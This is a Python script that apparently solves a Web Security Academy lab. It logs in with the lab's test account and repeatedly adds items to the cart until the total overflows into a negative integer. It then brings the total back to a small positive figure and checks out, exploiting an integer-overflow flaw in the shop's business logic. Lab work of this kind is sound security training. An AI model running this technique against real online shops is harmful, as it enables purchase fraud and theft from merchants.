import requests
from lxml import html
from rich.console import Console
import sys

console = Console()

SERVER = 'https://0aa200c904d90cdfc046aeae001e004a.web-security-academy.net'
STORE_CREDIT = 100

def login(session):
    response = session.get(f'{SERVER}/login')
    console.log(f'Status code {response.status_code}')
    document = html.fromstring(response.content)
    csrf_token = document.xpath("//input[@name='csrf']/@value")[0]
    console.log(f'CSRF token obtained: {csrf_token}')
    response = session.post(f"{SERVER}/login", data = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter",
    })
    if (response.status_code == 200):
        console.log('Login successful')


def add_product_to_cart_and_fetch_total(session, productId, quantity):
    response = session.post(f'{SERVER}/cart', data = {
        "productId": productId,
        "redir": "PRODUCT",
        "quantity": quantity
    })
    console.log(f"Status code for adding jackets = {response.status_code}")
    
    response = session.get(f'{SERVER}/cart')
    console.log(f'Status code for showing objects in cart and total amount = {response.status_code}')
    document = html.fromstring(response.content)
    total = document.xpath("//div[@class='container is-page']/table[2]/tbody/tr/th[2]")[0].text.split('.')[0]
    total_int=int(total.replace('$',''))
    print("TOTAL: ", total_int)
    return total_int

def fetch_csrf_token(session):
    response = session.get(f"{SERVER}/cart")
    console.log(f"Status code = {response.status_code}")
    html_document = html.fromstring(response.content)
    csrf_token = html_document.xpath("//form[@class='login-form']/input[@name='csrf']/@value")[0]
    console.log(f"CSRF Token = {csrf_token}")
    return csrf_token

def checkout(session, csrf_token):
    response = session.post(f"{SERVER}/cart/checkout", data={
        "csrf": csrf_token,
    })
    console.log(f"Status code = {response.status_code}")
    return response    

def main():
    console.log('About to start a new attack session...')
    session = requests.Session()
    with console.status("Login attempt"):
        login(session)

    total_amount = 0 #integer to store the total to be paid

    while total_amount>=0:
        total_amount=add_product_to_cart_and_fetch_total(session,1,99)

    while total_amount<=-65000:
        total_amount=add_product_to_cart_and_fetch_total(session,1,99)
    
    while(total_amount<0):
        total_amount=add_product_to_cart_and_fetch_total(session,6,13)

    print('TOTAL AMOUNT IN THE END: ',total_amount)

    token=fetch_csrf_token(session)

    response=checkout(session, token)

    if response.status_code == 200:
        print('Challenge completed')

if __name__ == "__main__":
    main()